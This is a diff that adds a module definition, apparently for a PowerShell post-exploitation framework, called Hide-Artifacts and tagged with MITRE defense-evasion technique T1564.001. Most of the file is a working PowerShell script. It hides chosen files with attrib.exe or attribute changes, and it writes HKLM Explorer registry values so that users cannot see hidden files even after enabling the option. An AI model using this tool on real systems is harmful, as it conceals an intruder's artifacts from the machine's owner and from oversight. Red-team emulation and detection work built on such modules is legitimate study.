@@ -1,0 +1,84 @@
+name: Hide-Artifacts
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Hides files and directories on a Windows target using multiple
+  methods. Supports attrib.exe to set hidden and system attributes,
+  PowerShell to modify file attributes directly, and registry
+  modification to disable the Show Hidden Files and Show Super Hidden
+  options in Windows Explorer. The registry method prevents users
+  from seeing hidden files even when they enable the option.
+software: ''
+tactics: [TA0005]
+techniques: [T1564.001]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: FilePath
+    description: Path to the file or directory to hide.
+    required: true
+    value: ''
+  - name: Method
+    description: >-
+      Method to use for hiding (attrib, powershell, registry). Registry method hides
+      all hidden files globally.
+    required: true
+    value: 'attrib'
+    suggested_values:
+      - attrib
+      - powershell
+      - registry
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Hide-Artifacts {
+      param(
+          [string]$FilePath,
+          [string]$Method = "attrib"
+      )
+
+      switch ($Method.ToLower()) {
+          "attrib" {
+              if (-not $FilePath -or -not (Test-Path $FilePath)) {
+                  Write-Output "[-] File not found: $FilePath"
+                  return
+              }
+              $result = attrib.exe +h +s $FilePath 2>&1
+              Write-Output "[+] Set hidden and system attributes on: $FilePath"
+              if ($result) { Write-Output $result }
+          }
+          "powershell" {
+              if (-not $FilePath -or -not (Test-Path $FilePath)) {
+                  Write-Output "[-] File not found: $FilePath"
+                  return
+              }
+              $file = Get-Item $FilePath -Force
+              $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+              Write-Output "[+] Set Hidden and System attributes via PowerShell on: $FilePath"
+          }
+          "registry" {
+              $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+              reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f 2>&1 | Out-Null
+              reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 0 /f 2>&1 | Out-Null
+              Write-Output "[+] Disabled ShowSuperHidden and Hidden in Explorer registry."
+              Write-Output "[+] Users will not be able to see hidden files in Explorer."
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method. Use attrib, powershell, or registry."
+          }
+      }
+  }
+script_end: Hide-Artifacts {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
